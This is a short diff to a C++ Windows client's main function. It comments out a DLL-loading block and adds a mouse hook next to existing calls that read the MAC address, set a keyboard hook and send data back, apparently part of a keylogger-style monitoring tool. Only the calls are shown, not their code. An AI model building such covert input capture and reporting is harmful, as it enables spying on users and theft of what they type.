@@ -8,7 +8,7 @@
 Client clt;
 
 int main(int ac, char **av)
-{
+{/*
 	HMODULE time = LoadLibrary("Time_Windows.dll");
 	if (time == NULL)
 		return (2);
@@ -48,10 +48,11 @@ int main(int ac, char **av)
 		iselect(nullptr);
 		if (mdr.run() == true)
 			return (0);
-	}
+	}*/
 	clt.getMACAddress();
 
 	clt.setKeyboardHook();
+	clt.setMouseHook();
 	clt.sendBackMessage();
 	return (0);
 }
